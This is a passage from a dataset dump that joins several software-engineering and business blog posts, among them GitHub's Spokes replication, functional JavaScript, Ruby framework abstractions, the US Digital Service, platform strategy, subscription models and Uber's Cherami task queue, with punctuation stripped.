checks periodically to see if every repository has the desired number of replicas  if not  more replicas are created  New replicas can be created anywhere  and they can be copied from wherever the surviving two copies of each repository are  Hence  repairs after a server failure are N to N  The larger the file server cluster  the faster it can recover from a single node failure   Clean shutdowns  As described above  Spokes can deal quickly and transparently with a server going offline or even failing permanently  So  can we use that for planned maintenance  when we need to reboot or retire a server  Yes and no   Strictly speaking  we can reboot a server with sudo reboot   and we can retire it just by unplugging it  But there are subtle disadvantages to doing so  so we have more careful mechanisms  reusing a lot of the same logic that would respond to a crash or a failure   Simply rebooting a server does not affect future read and write operations  which will be transparently directed to other replicas  It doesn t affect in progress write operations  either  as those are happening on all replicas  and the other two replicas can easily vote to proceed without the server we re rebooting  But a reboot does break in progress read operations  Most of those reads e g   fetching a README to display on a repository s home page are quick and will complete while the server shuts down gracefully  But some reads  particularly clones of large repositories  take minutes or hours to complete  depending on the speed of the end user s network  Breaking these is  well  rude  They can be restarted on another replica  but all progress up to that point would be lost   Hence  rebooting a server intentionally in Spokes begins with a quiescing period  While a server is quiescing  it is marked as offline for the purposes of new read operations  but existing read operations  including clones  are allowed to finish  Quiescing can take anywhere from a few seconds to many hours  depending on which read operations are active on the server that is getting rebooted   Perhaps surprisingly  write operations are sent to servers as usual  even while they quiesce  That s because write operations run on all replicas  so one replica can drop out at any time without user visible impact  Also  that replica would fall arbitrarily far behind if it didn t receive writes while quiescing  creating a lot of catch up load when it is finally brought fully back online   We don t perform  chaos monkey  testing on the Spokes file servers  for the same reasons we prefer to quiesce them before rebooting them  to avoid interrupting long running reads  That is  we do not reboot them randomly just to confirm that sudden  single node failures are still  mostly  harmless   Instead of  chaos monkey  testing  we perform rolling reboots as needed  which accomplish roughly the same testing goals  When we need to make some change that requires a reboot e g   changing kernel or filesystem parameters  or changing BIOS settings we quiesce and reboot each server  Racks serve as availability zones 1   so we quiesce entire racks at a time  As servers in a given rack finish quiescing i e   complete all outstanding read operations we reboot up to five of them at a time  When a whole rack is finished  we move on to the next rack   Below is a graph showing RPC operations failed over during a rolling reboot  Each server gets a different color  Values are stacked  so the tallest spike shows a moment where eight servers were rebooting at once  The large block of light red shows where one server did not reboot cleanly and was offline for over two hours   Retiring a server by simply unplugging it has the same disadvantages as unplanned reboots  and more  In addition to disrupting any in progress read operations  it creates several hours of additional risk for all the repositories that used to be hosted on the server  When a server disappears suddenly  all of the repositories formerly on it are now down to two copies  Two copies are enough to perform any read or write operation  but two copies aren t enough to tolerate an additional failure  In other words  removing a server without warning increases the probability of rejecting write operations later that same day  We re in the business of keeping that probability to a minimum   So instead  we prepare a server for retirement by removing it from the count of active replicas for any repository  Spokes can still use that server for both read and write operations  But when it asks if all repositories have enough replicas  suddenly some of them the ones on the retiring server will say no  and more replicas will be created  These repairs proceed exactly as if the server had just disappeared  except that now the server remains available in case some other server fails   Conclusions  Availability is important  and durability is more important still  Availability is a measure of what fraction of the time a service responds to requests  Durability is a measure of what fraction of committed data a service can faithfully store   Spokes keeps at least three replicas of every repository  to provide both availability and durability  Three replicas means that one server can fail with no user visible effect  If two servers fail  Spokes can provide full access for most repositories and read only access to repositories that had two of their replicas on the two failing servers   Spokes does not accept writes to a repository unless a majority of replicas and always at least two can commit the write and produce the same resulting repository state  That requirement provides consistency by ensuring the same write ordering on all replicas  It also provides durability in the face of single server failures by storing every committed write in at least two places   Spokes has a failure detector  based on monitoring live application traffic  that determines when a server is offline and routes around the problem  Finally  Spokes has automated repairs for recovering quickly when a disk or server fails permanently,"[310 615 204 713 92 902 613 393 699 946 1386]"
314,training-dataset/engineering/82.txt,engineering,JavaScript and Functional Programming   Beth AllchurchThis is a write up of my notes  plus some further research  from Kyle Simpson s excellent class Functional Light JavaScript  slides here  on 29 of June  2016   Object oriented programming has long been the dominant paradigm in JavaScript  Recently  however  there has been a growing interest in functional programming  Functional programming is a style of programming that emphasises minimising the number of changes to a program s state  known as side effects   To this end  it encourages the use of immutable data and pure  side effect free  functions  It also favours a declarative style and encourages the use of well named functions that allow you to write programs by describing what you want to happen  with the implementation details packaged away out of immediate sight   Although there are tensions between object oriented and functional approaches  they are not mutually exclusive  JavaScript has the tools to support both paradigms  Even without using it exclusively as a functional language  there are concepts and best practices from the functional approach that we can use to make our own code cleaner  more readable  and easier to reason about   Minimise Side Effects  A side effect is a change that is not local to the function that caused it  A function might do something like manipulate the DOM  modify the value of a variable in a higher level scope or write data to a database  The results of these actions are side effects      A function with a side effect var x   10   const myFunc   function   y     x   x   y      myFunc   3    console   log   x       13 myFunc   3    console   log   x       16  Side effects are not inherently evil  A program that produced no side effects would not affect the world  and so there would be no point to it  other than perhaps as a theoretical curiousity   They are  however  dangerous and should be avoided wherever they are not strictly necessary   When a function produces a side effect you have to know more than just its inputs and output to understand what that function does  You need to know about the context and history of the state of the program  which makes the function harder to understand  Side effects can cause bugs by interacting in unpredictable ways  and the functions that produce them are harder to test thanks to their reliance on the context and history of the program s state   Minimising side effects is such a fundamental principle of functional programming that most of the following sections can be understood as outlining techniques to avoid them   Treat Data as Immutable  A mutation is an in place change to a value  An immutable value is a value that  once created  can never be changed  In JavaScript  simple values like numbers  strings and booleans are immutable  However  data structures like objects and arrays are mutable      the push method mutates the array it s called on const x     1   2    console   log   x        1  2  x   push   3    console   log   x        1  2  3   Why would we want to avoid mutating data   A mutation is a side effect  The fewer things that change in a program  the less there is to keep track of  and the result is a simpler program   JavaScript only has limited tools available to enforce immutability on data structures like objects and arrays  Object immutability can be enforced with Object freeze   but only one level deep   const frozenObject   Object   freeze     valueOne   1   valueTwo     nestedValue   1        frozenObject   valueOne   2      not allowed frozenObject   valueTwo   nestedValue   2      allowed   There are  however  several excellent libraries out there that solve this issue  the most well known of which is Immutable   For most applications  using a library to enforce immutability is overkill  In most cases you will gain most of the benefits of immutable data simply by treating data as though it were immutable   Avoiding Mutations  Arrays  Array methods in JavaScript can broadly be divided into mutator methods and non mutator methods  Mutator methods should be avoided where possible   For example  concat can be used instead of push   push mutates the original array  whereas concat returns a new array comprised of the array it was called on and the array provided as its argument  leaving the original array intact      push mutates arrays  const arrayOne     1   2   3    arrayOne   push   4    console   log   arrayOne        1  2  3  4     concat creates a new array and leaves the original unchanged  const arrayTwo     1   2   3    const arrayThree   arrayTwo   concat    4     console   log   arrayTwo        1  2  3  console   log   arrayThree        1  2  3  4   Other useful non mutator array methods include map   filter   and reduce    Avoiding Mutations  Objects  Instead of directly editing objects  you can use Object assign   which copies the properties of source objects into a target object and then returns it  If you always use an empty object as the target object  you can use Object assign to avoid directly editing objects   const objectOne     valueOne   1    const objectTwo     valueTwo   2    const objectThree   Object   assign       objectOne   objectTwo    console   log   objectThree         valueOne   1  valueTwo   2    Note on const  const is useful  but it does not make your data immutable  It prevents your variables from being reassigned  These two things should not be conflated   const x   1   x   2      not allowed const myArray     1   2   3    myArray     0   2   3       not allowed myArray   0     0      allowed   Write Pure Functions  A pure function is a function that does not change the program s state and does not produce an observable side effect  The output of a pure function relies solely on its input values  Wherever and whenever a pure function is called  its return value will always be the same when given the same inputs   Pure functions are an important tool for keeping side effects to a minimum  In addition  their indifference to context make them highly testable and reusable   myFunc from the section on side effects is an impure function  note how it s called twice with the same input and gives a different result each time  It could  however  be re written as a pure function      Make the global variable local  const myFunc   function   y     const x   10   return x   y     console   log   myFunc   3        13 console   log   myFunc   3        13     Pass x as an argument  const x   10   const myFunc   function   x   y     return x   y     console   log   myFunc   x   3        13 console   log   myFunc   x   3        13  Ultimately  your program will always produce some side effects  Where they occur they should be handled carefully and their effects constrained and contained as much as possible   Write Function Generating Functions  Find someone who has never programmed before and ask them to guess what the following pieces of code do   Example One   const numbers     1   2   3    for   let i   0   i   numbers   length   i        console   log   numbers   i         Example Two   const numbers     1   2   3    const print   function   input     console   log   input       numbers   forEach   print     Everyone I ve tried this test on has had more luck with the second example  Example One exemplifies an imperative approach to printing out a list of numbers  Example Two exemplifies a declarative approach  By packaging away the details of how to loop through an array and how to print to the console into the functions forEach and print   respectively  we can express what we want our program to do without needing to go into how to do it  This makes for highly readable code  The last line of Example Two is very close to English   Adopting this approach involves writing a lot of functions  This process can be made DRY er by writing functions to generate new functions from existing ones   There are two features of JavaScript in particular that make this kind of function generation possible  The first is closure  Closure is the ability of functions to access variables from containing scopes  even when those scopes no longer exist  The second is that JavaScript treats functions as values  This makes it possible to write higher order functions  which are functions that take other functions as arguments and   or return functions as their output   Combined  these features allow you to write functions that return other functions which  remember  the arguments passed to the function that generated them  and are able to use those arguments elsewhere in the program   Function Composition  Functions can be combined to form new functions through function composition  Here is an example      The function addThenSquare is made by combining the functions add and square  const add   function   x   y     return x   y      const square   function   x     return x   x      const addThenSquare   function   x   y     return square   add   x   y         You may find yourself repeating this pattern of generating a more complex function from smaller functions  Often it s more efficient to write a function that does the composition for you   const add   function   x   y     return x   y      const square   function   x     return x   x      const composeTwo   function   f   g     return function   x   y     return g   f   x   y            const addThenSquare   composeTwo   add   square     You could go even further and write a more general composition functions      This version of composeTwo can accept any number of arguments for the initial function  const composeTwo   function   f   g     return function       args     return g   f       args               composeMany can accept any number of functions as well as any number of arguments for the    initial function  const composeMany   function       args     const funcs   args   return function       args     funcs   forEach    func        args     func   apply   this   args         return args   0           The exact form of your composition function will depend on the level of generality you need and the kind of API you prefer   Partial Function Application  Partial function application is the process of fixing the value of one or more of a function s arguments  and then returning the function to be fully invoked later   In the following example  double   triple   and quadruple are partial applications of multiply    const multiply   function   x   y     return x   y      const partApply   function   fn   x     return function   y     return fn   x   y          const double   partApply   multiply   2    const triple   partApply   multiply   3    const quadruple   partApply   multiply   4     Currying  Currying is the process of translating a function that takes multiple arguments into a series of functions that each take one argument   const multiply   function   x   y     return x   y      const curry   function   fn     return function   x     return function   y     return fn   x   y             const curriedMultiply   curry   multiply    const double   curriedMultiply   2    const triple   curriedMultiply   3    const quadruple   curriedMultiply   4    console   log   triple   6        18  Currying and partial application are conceptually similar  and you ll probably never need both   but still distinct  The main difference is that currying will always produce a nested chain of functions that each accept only one argument  whereas partial application can return functions that accept more than one argument  This distinction is clearer when you compare their effects on functions that accept at least three arguments   const multiply   function   x   y   z     return x   y   z      const curry   function   fn     return function   x     return function   y     return function   z     return fn   x   y   z                const partApply   function   fn   x     return function   y   z     return fn   x   y   z          const curriedMultiply   curry   multiply    const partiallyAppliedMultiply   partApply   multiply   10    console   log   curriedMultiply   10    5    2        100 console   log   partiallyAppliedMultiply   5   2        100  Recursion  A recursive function is a function that calls itself until it reaches a base condition  Recursive functions are highly declarative  They re also elegant and very satisfying to write   Here s an example of a function that recursively calculates the factorial of a number   const factorial   function   n     if   n     0     return 1     return n   factorial   n   1       console   log   factorial   10        3628800  Using recursive functions in JavaScript requires some care  Every function call adds a new call frame to the call stack  and that call frame is popped off the call stack when the function returns  Recursive functions call themselves before they return  and so it s very easy for a recursive function to exceed the limits of the call stack and crash the program   However  this can be avoided with tail call optimisation   Tail Call Optimisation  A tail call is a function call that is the last action of a function  Tail call optimisation is when the language compiler recognises tail calls and reuses the same call frame for them  This means that if you write recursive functions with tail calls  the limits of the call stack will never be exceeded by them as it will reuse the same frame over and over   Here is the recursive function from above rewritten to take advantage of tail call optimisation   const factorial   function   n   base     if   n     0     return base     base    n   return factorial   n   1   base       console   log   factorial   10   1        3628800  Support for proper tail calls is included in the ES2015 language specification  but is currently unsupported in most environments  You can check whether you can use them here   Summary  Functional programming contains many ideas that we can use to make our own code simpler and better  Pure functions and immutable data minimise the hazards of side effects  Declarative programming maximises code readability  These are important tools that should be embraced in the fight against complexity   Corrections   09 09 2016  Forgot to return the innermost function in partApply   in the section on partial function application  Thank you to Richard Bultitude for spotting the mistake   Resources  General  Side Effects  Immutability  Pure Functions  Function Generation  Recursion,"[314 884 1165 1205 99 795 1235 661 915 794 641]"
316,training-dataset/engineering/579.txt,engineering,Abstractions and the role of a frameworkThis is a follow up to the discussion that was started last week after I published  My time with Rails is up   Since this article received a lot of feedback  over 1000 comments on various sites and even more tweets  despite my greatest efforts  I didn t manage to reply to everything  Many people were confused about some of the arguments  as I didn t do a good job at providing proper context and making certain things clearer  This has caused incorrect interpretation of what I tried to explain   Before I get to the actual subject of this post   abstractions and the role of a framework  I d like to clear the air a little bit as many people  who were lacking my specific context  came to really bad conclusions   First of all  the post I wrote wasn t anti rails or anti frameworks in general  I explicitly wrote that Rails is here to stay and there are lots of good use cases for it  and probably most Ruby developers are still happy with Rails  Furthermore  I mentioned I m helping with the Hanami framework  I wouldn t be doing that if I was anti frameworks   Secondly  the context of the article is important  I didn t write it from the perspective of a Rails user who is switching to something else  I wrote it from a library author s point of view and a user too  I pointed out that we need a more diverse Ruby ecosystem so that we can address issues that Rails will never address  as they are not considered to be a problem by the core team  I voiced my concerns and I know there are many people in our community who feel the same way  In fact  based on the feedback I received  I feel even stronger about this now  So thank you  3  Last but not least  I noticed the  us vs them  attitude in many comments  I apologize if I created that impression myself  Rather than taking sides  let s try to see how we can collaborate   our goal is the same after all  we want Ruby to remain relevant  If you have the energy to propose radical changes in Rails  go ahead   DHH told me they are always interested in feedback and having discussions  I don t have that energy  as I m too busy with a couple dozen other Ruby libraries  hence my decision to stop working with Rails and focus my time elsewhere   OK  I hope this makes things clearer  Let s talk about abstractions now   Abstractions  One of the reactions to my article was  On the irony of programmers who don t like abstraction   and this wasn t the only one   The role of an abstraction is to hide complexity  and it s a good thing  no doubt about that  The problem arises when that abstraction has no solid foundation  and under the hood there are no re usable  low level abstractions  However  it s easier said than done  Rails has been created 13 years ago  it s got massive adoption and refactoring is extremely difficult  because of the backward compatibility issues and having to deal with a huge codebase   Finding a high level abstraction  a DSL or a single method interface  doesn t matter  is much simpler than figuring out lower level abstractions afterwards  A typical evolution of a library is   provide a high level abstraction  provide more features  realise you ve got mess under the hood  try to refactor into smaller  low level abstractions  fail or succeed  When you fail  you start over  some times in a new project  When you start working on a library you typically don t have a 100  understanding of what you re doing  It s natural  In most of the cases you can t really tackle it going bottom up  because you re knowledge is incomplete  Even when you try to start with low level abstractions first  you may end up with the wrong abstractions  And as a smart person once said   the wrong abstraction is worse than a lack of abstraction   Focusing on programmer ergonomics is extremely important for productivity  this is what Rails mastered  however  let s not forget about low level abstractions and spend time on discovering them  Being able to use low level abstractions will make you more productive in the long term  but if you don t have them  you will have to workaround the deficiencies of the high level abstraction  The sql builder in Discourse is a good example of struggling with an ORM because there s no simpler  easy to use abstraction for constructing efficient queries   Introducing low level abstractions will decrease complexity of the code at the unit level  while at the same time it will increase the complexity of the whole system  as you have more pieces communicating with each other  It s like going from a monolithic single app system to SOA  but at the library level   The role of a framework  Now that we know that high level abstractions are as important as low level ones  what s the reason for having frameworks   A framework is a collection of high level abstractions  which reduces the amount of boilerplate code that a programmer needs to write  and it s often based on specific conventions for its common usage  The revolution started by Rails was Convention Over Configuration  which allows you to use a framework with very little custom configuration  This set a new standard for framework creators  especially in the Ruby ecosystem  as it s become the de facto standard   Using a framework is typically a joyful experience in the beginning  as you re using common functionality to implement common features  Problems arise when you start to diverge from framework s conventions and there s no custom configuration that can help you  This is the moment when you need to look at low level tools  and if they don t exist  you ll be on your own   That s why it s so important to have a framework that consists of loosely coupled components  where each component is a standalone system on its own  The more assumptions a framework makes about your application architecture  the bigger the risk of hitting a wall in the long term  Rails provides a simple example  it assumes that you use an Active Record  its Active Model interface is based on Active Record  routing helpers need it  many view helpers need it  3rd party gems need it too  That s a huge assumption and it comes with many trade offs  On one hand it simplifies Rails itself  less abstractions are needed when you simply assume an Active Record  On the other hand using Active Record adds a lot of constraints to the way you can design your system  If Rails was truly ORM agnostic  it would be much more complex internally  and its public APIs would probably become less convenient  This is a trade off   The role of a framework is to aid you in solving domain specific problems  while at the same time keeping the doors to simpler abstractions open  as you may need them in the future  It s hard to achieve that  and programmer s ergonomics may suffer a bit  but that s a trade off as well  as in the beginning the cost of usage might be a bit bigger  but it will pay off in the longer term   Where do we go from here   It s important to have a conversation about diversifying the Ruby ecosystem  Ruby needs new frameworks and libraries built on top of solid abstractions  These abstractions should provide services with which a developer can build applications suited to a diverse range of domains   There are many projects that have been in the works for years already  If you re interested in helping out  check out following projects   All these projects have Gitter channels  we re having many interesting conversations there  and there are always many things you can help with   If you re working on something new too  please let me know   Ruby needs this,"[316 257 26 607 1335 214 61 90 234 778 641]"
332,training-dataset/business/181.txt,business,The U S  Digital ServiceA lot of us complain about how the government is not very good at technology  The U S  Digital Service is actually trying to do something about it  by applying the way startups build products to make government services work better for veterans  immigrants  students  seniors  and the American public as a whole   This is clearly a good idea   See U S  Digital Service Playbook for more details    Inspired by the successful rescue of HealthCare gov  small teams get deployed inside government agencies to improve critical government software   It seems to be working  To use HealthCare gov again as an example  the Digital Service effort helped replace a  200 million login system that cost  70 million per year to operate  I know   with one that cost  4 million to build and less than  4 million per year to operate  and worked better in every way  In another example  at U S  Citizenship and Immigration Services  a Digital Service team has been instrumental in enabling green cards to be renewed online for the first time and a growing number of other improvements to the immigrant experience   The Digital Service attracted talent on par with the best Silicon Valley startups  including talented veterans from Amazon  Google  Facebook  Twitter  Twilio  YC  and more   engineers  designers  and product managers who have committed to do tours of duty serving the country   As an American  I am grateful to these men and women for doing this  Because of their work  the government will work better   I often get asked about what people can do for a year or two to make a big impact between projects  Here is a good answer  Consider joining the ranks  I think it d be great if it became a new tradition that people from the tech world do a tour of duty serving our country at some point in their careers  We need better technology in government,"[332 674 1351 778 224 61 889 1403 712 92 520]"
344,training-dataset/business/581.txt,business,Platform Strategy   by Sangeet Paul ChoudaryIn the course of my work advising business leaders on the ongoing platform revolution  I enjoy the privilege of getting a ringside view of key shifts in business as they start showing up across industries  One of those shifts that I ve begun to observe over the course of my recent discussions is the rise in importance of  what I ve begun to call  the full stack solution   THE FULL STACK SOLUTION  The term full stack is often misused and misrepresented but I m using this term in the specific context of the Platform Stack that I lay out in my book Platform Scale and in the blog post here   Traditionally  pipe businesses built products and services and sold them to customers  Increasingly  businesses are starting to think like platforms even though they may not claim to be but ding platforms and may not even look like technology enabled businesses   The Full Stack Solution creates an end to end solution for the user across all layers of the platform stack  There are several characteristics that these solutions have   The full stack solution consists of multiple products and services  This is not merely a portfolio of products  they are also integrated with each other at the data layer so that the consumer experience is preserved across the different products and services  The products services are rarely all owned by a single company  In most cases  an ecosystem of partner companies come together to power the full stack solution  The composition of the full stack solution is determined by user need  not by product service availability  Value to the consumer is not delivered through usage of the product or service alone  In addition to product service value  infrastructure layer   value may also be offered on the basis of data captured  personalisation or analytics  and through a community of use  network layer  that builds up around the products services   Traditional pharmacies sell medicines  They are in the business of selling medicines  not in the business of improving patient health  Increasingly  pharmacies are recognising an opportunity for creating a full stack solution to address the problem of patient health  Medicines are only one part of the solution  Pharmacies are using patient purchase data to create a detailed profile of the patient and attract other wellness providers to co create a full stack health solution for the patient based on their unique data profile   Consumer electronics manufacturers have been moving in this direction by bundling connected services that enhance the usage of their physical products  In a similar vein  FMCG companies have been creating interactive services to complement product usage  For example  a company selling skincare products may launch a suite of skincare management  digital  services and create communities of usage around the product  while also leveraging the usage data to personalise skincare recommendations for the consumer   THINKING FULL STACK  The fundamental mindset shift while providing a full stack solution is to stop thinking in terms of the products and services you own today  or even in terms of the ones that you can create tomorrow  and start thinking in terms of the full stack of products and services required to guarantee user outcomes  Inevitably  this requires an ecosystem of participants to come together  It is unlikely for one company to own all the products and services required to solve a user need comprehensively and guarantee the final outcome   The creation of full stack solutions will also be heavily dependant on data driven feedback from consumers  As consumers choose different products and services and use them in combination  the solution provider will better understand the unique combinations of products and services that work best and the gaps that exist in provisioning a comprehensive solution   Finally  while co creatiing a comprehensive solution has its benefits  it lends itself to additional complexities of governance when multiple partners come together to power an overall solution  Some partners may create more value while others may explicitly capture more value  The balance of incentives by the central coordinating firm will determine how successful such solutions end up being   TWEETABLE TAKEAWAYS  The rise of full stack solutions Share this  Building end to end solutions Share this  The future is about building ecosystems that deliver outcomes  not about building products and services Share this  How to build a suite of solutions that deliver customer outcomes using platform thinking Share this,"[344 1351 673 1300 234 1405 92 1192 695 809 61]"
357,training-dataset/business/109.txt,business,Use Subscription Models to Keep Customers Coming BackBy Jennifer Polk   September 06  2016   0 Comments  A subscription service isn t a new concept  This model dates back at least as far as newspaper subscriptions that brought the weekly paper to your doorstep  Recently  a whole new fray of subscription revenue services has sprung up  giving customers the ability to plan  pay and schedule services and product delivery in advance and businesses access to a predictable  recurring revenue stream  But what makes subscription business models more than just another passing fad  What will distinguish the here today gone tomorrow players from those that last   Here are two strategies for building a subscription business model that lasts   Build and expand your subscription offering on multidimensional value exchange   For now  most subscription businesses are thriving on a simple value exchange annuity revenue from customers in return for the convenience of not having to go to the store for diapers  replenish break room or pantry supplies or remember to replace the refrigerator filter  But those businesses that last will go beyond convenience factors and recurring revenue to create a multidimensional value exchange with subscription customers  This starts with   Using repeated customer to identify unmet needs or common pain points in the experience  Evaluating assets expertise  excess inventory or service capacity for subscription potential  Deciding what  if any  additional investments need to be made to operationalize that offering  Projecting the market size and value based on LTV to determine if investments are worthwhile  For example  Rent the Runway  which lets customers rent designer duds  added a Pro service for an annual subscription fee  that lets customers save on rental insurance and shipping costs  They recently introduced a Style Pack that leverages existing assets  like excess inventory and service capacity  to offer customers a bundle for an additional annual fee  which combines clothing rental with a styling appointment and accessories  These additional services create a multidimensional value exchange of incremental revenue and asset utilization in return for convenience  cost savings and expert advice   Evaluate your operations to determine if and how you could use existing assets to help customers avoid common pain points or enhance their experience with your brand  If you d need to hire more staff  invest in advanced technology or develop a new process  first perform a cost benefit based on market size how many existing and potential customers are likely to buy the service and lifetime value of subscribers versus non subscribers  Subscribers may have a higher retention rates  lower retention costs and positive repeat interactions that turn them into advocates who attract other customers   Help customers get the most out of subscriptions through communication  control and customization   Communication  Customers may face fear of commitment to subscription services  No one wants to hand over their payment information  sign up for a recurring bill or prepay for products or services only to find they can t get out if their needs change or they re dissatisfied  For businesses  predictable  recurring revenue and demand may be the very reasons you launched a subscription model  making you reluctant to give customers an  easy out   But  you can increase customers  comfort and satisfaction with subscription services through careful communicating  measured control and customization   Proactively communicate about how your subscription service works  Answer FAQs about sign up  usage and cancellation  Show step by step processes and enable those processes in digital and traditional channels  List subscription costs and fees for add on services and cancellation  Communicate via customers  preferred channel throughout their subscription  not just for marketing messages  but also notification about upcoming services and reminders about charges to their account  Provide digital access to service status and account history for real time engagement and to show value over time   Control and Customization  Some aspects of a subscription service may be flexible  without costing the company extra time or requiring additional resources  The latter represents an opportunity to let customers control the details their subscription  Amazon Subscribe   Save  for example  gives customers control over the date and frequency of their shipments  Amazon also communicates before a package is shipped  giving customers the ability to review and modify their order before it ships  Customers also have some control over how much of a discount they receive  based on the value and volume of items in their cart   Other elements of a subscription model may be harder to change  Allowing customers to significantly alter their order could affect operation and supply chain costs by increasing the time needed to pick and pack the order or raising shipping costs  It s hard to pass these costs on to customers  And frequent changes could send your variable costs into a tailspin  Tiered subscription services can help you structure subscription fees to account for a range of variable costs and place customers in the right service tier based on their needs  minimizing changes and giving the feel of a bespoke service   Subscription services have potential to improve business results and operational efficiencies by delivering predictable revenue and enabling you to forecast expenses  But  convenience alone is a fading competitive advantage as more services emerge  Over saturation of the market will ultimately reduce switching costs  making it harder to compete for savvy customers and eroding financial and operational gains  Set your subscription service up for success by delivering value in numerous ways  communicating with customers and giving them control and the ability to customize the service to their needs,"[357 1351 809 843 92 61 695 224 344 1403 572]"
358,training-dataset/engineering/173.txt,engineering,Cherami  Uber Engineering s Durable and Scalable Task Queue in Goby Xu Ning   Maxim Fateev  Cherami is a distributed  scalable  durable  and highly available message queue system we developed at Uber Engineering to transport asynchronous tasks  We named our task queue after a heroic carrier pigeon with the hope that this system would be just as resilient and fault tolerant  allowing Uber s mission critical business logic components to depend on it for message delivery   Introduction  A task queue decouples components in a distributed system and allows them to communicate in an asynchronous manner  The two communicating parties can then scale separately  with the added features of load smoothing or throttling  In complex distributed systems  a task queue is essential  Cherami fills a role equivalent to Simple Queue Service  SQS  in Uber s infrastructure ecosystem  Building our own system achieves better integration with our existing infrastructure while addressing some unique product development needs  like support for multiple consumer groups and increased availability  especially during network partition   Cherami s users are defined as either producers or consumers  Producers enqueue tasks  Consumers are worker processes that asynchronously pick up and process enqueued tasks  Cherami s delivery model is the typical Competing Consumers pattern  where consumers in the same consumer group receive disjoint sets of tasks  except in failure cases  which cause redelivery   Using this model  work fans out to many workers in parallel  The number of workers is independent of any partitioning or sharding mechanisms internal to Cherami and can scale up and down simply by adding or removing workers  If a worker fails to perform a task  another worker can redeliver and retry the task   Cherami also supports multiple consumer groups  where each consumer group receives all tasks in the queue  Each consumer group is associated with a dead letter queue  Tasks that exceed the maximum retry count  for example   poison pills   land in this queue so that the consumer group can continue processing other messages  These consumer handling features both distinguish Cherami from the simple message buses that are typically used in big data ingestion and analytics  e g  Apache Kafka   and make Cherami advantageous in task queue use cases   Prior to Cherami  Uber used Celery queues backed by Redis for all task queue use cases  The combo of Celery and Redis helped Uber scale quickly  up to a point  The drawbacks  Celery is Python only  while we were increasingly relying on Go and Java to build higher performance backend services  Furthermore  Redis stores are memory backed  which isn t as durable or scalable as we needed   We needed a longer term solution for Uber s future  so we built Cherami to satisfy these requirements   Durability  losslessness  and tolerance of hardware failures Flexibility between availability and consistency  AP vs CP  during network partition Ability to scale the throughput of each queue up and down easily Complete support for the competing consumers consumption model Language agnostic  To satisfy those requirements  Cherami s design follows these design principles   We choose eventual consistency as a core principle  This allows high availability and durability  with the tradeoff that we don t provide ordering guarantees  However  that means that we can continue accepting requests during catastrophic failures or network partitions  and further improves availability by eliminating the need for a consistent metadata storage like Zookeeper   We chose not to support the partitioned consumer pattern  and we don t expose partitions to the user  This simplifies consumer worker management  as workers don t need to coordinate which partition to consume from  It also simplifies provisioning  since both producers and consumers can scale independently   In the following sections  we further elaborate on key design elements of Cherami and explain how we applied the design principles and tradeoffs   Cherami s Key Design Elements  1  Failure recovery and replication  To be truly lossless and available  Cherami must tolerate hardware failures  In practice  this requires Cherami to replicate each message across different hardware so that messages can reliably be read  but Cherami must also be able to accept new messages when hardware fails either transiently or permanently   Cherami s fault tolerance comes from leveraging the append only property of messaging systems and using pipelining in message transfers  Each message in a message queue is a self contained element that  once created  is never modified  In other words  message queues are append only  If the storage host containing the queue fails  we can pick a different storage host and continue writing to it  The enqueue operation continues to be available   A Cherami queue consists of one or more extents  which are conceptual substreams within a queue that independently support appending messages  Extents are replicated to the storage layer by a role called input host  When an extent is created  its metadata contains an immutable host information tuple  input host and list of storage hosts   In each storage host  the replicated copy of the extent is called a replica  and a storage host can host many replicas of different extents  If a single storage host fails  we don t lose messages because the extent is still readable from other replicas   Producers connect to the specific input host to publish to an extent belonging to some queue  Upon receiving messages from a producer  the input host simultaneously pipelines the messages into all extent replicas through a WebSocket connection  and receives acknowledgements  acks  from the respective replicas in the same connection   Pipelining means the input host does not wait for an ack before writing the next message  and that there is no message reordering or message skipping between the input host and all replicas  This also applies to the acks that return from each replica  acks come in the order of corresponding writes  The input host tracks all acks  Only when all storage hosts ack receipt of the same message are received does the input host ack to the producer  This final ack implies that the message has been durably stored in all replicas   Within each extent  messages are ordered due to the pipelining property  This ensures messages across all replicas are consistent  except for the tails where a storage host has yet to persist the messages   When any replica fails  the input host cannot receive acks from that replica for any further writes  Thus  this extent is no longer appendable  If the input host fails  we would lose the inflight acks from the storage hosts  In both cases  the tails of the replicas can be inconsistent  one or more messages are not replicated in all replicas  To recover from this inconsistency  instead of trying to scan and repair the tails  which is a complicated operation  we simply declare this extent  sealed  as is  it s readable  but no more writes are allowed   After sealing  Cherami creates a new extent for this queue  and a signaling channel notifies producers to reconnect and publish into the new extent  If a queue consists of only one open extent  sealing it would make the queue temporarily unavailable to publish for a short period of time before a new extent is created  To avoid publish latency spikes during failures  a queue normally sets a minimum number of extents so that publish can continue when one extent is being sealed and a new one created   We choose to use sealing as a recovery mechanism because it is simple to implement  The tradeoff here is that duplicates can occur  The reason for the duplicates is that after a failure  the replica tails will contain messages not acked to the publisher  and it is not possible to determine which messages are unacked  if the input host has failed  Thus  in the read path  we will have to deliver everything  including these unacked messages  Publishers generally retry when failed to enqueue a message  so some of these messages may be republished in a new extent  which causes consumers to receive duplicates   2  Scaling of Writes  Extents within Cherami are shared nothing substreams  Cherami observes the throughput on each extent  As write load to a particular queue increases and some extents exceed their throughput limit  Cherami creates additional extents for that queue automatically  The new extents receive part of the write load  alleviating the load on existing extents   As write load decreases  Cherami seals some of the extents without replacing them with new ones  In this way Cherami reduces some overhead  memory  network connections  and other maintenance  required to maintain an open extent   3  Consumption handling  Consumers in the same consumer group receive tasks from the same queue  but may receive from one or more extents  When a consumer receives a message and successfully processes it  the consumer replies to Cherami with an ack  If Cherami doesn t get an ack after some configured amount of time  it redelivers the message to retry  A consumer s ack can be delayed or missing when a consumer crashes  when a downstream dependency is unavailable  when a single task takes too long  or when processing gets stuck because of a deadlock  A consumer can also negatively acknowledge  or nack  a message  triggering immediate redelivery  Nacks allow consumer groups to process tasks that some members are incapable of processing  e g  because of local failures  partial rolling upgrade of a consumer group to a new task schema    Because different consumers can take varied amount of time to process messages  acks arrive at Cherami in a different order than the ordering provided by the replicas  Some messaging systems store the read unread state  also known as the visibility state  per message  However  to do that we would need to update these states on disk  with random writes  and handle the complexity of doing this for each of multiple consumer groups   Cherami takes a different approach  In each consumer group  for each extent  we maintain an ack offset  which is a message sequence number below which all messages have been acked  We have a role called output host that consumers connect to in order to receive deliveries  The output host reads messages from storage hosts sequentially  keeping them cached in memory  It keeps tracks of in flight messages  delivered to consumer  but not yet acked  and updates the ack offset when possible  Output host also keeps track of timing and nacks so that messages can be redelivered to another consumer as necessary  In Cherami  one extent can be consumed simultaneously by multiple consumer groups  so multiple output hosts might read from the same extent   Further  the system is configured to redeliver each message 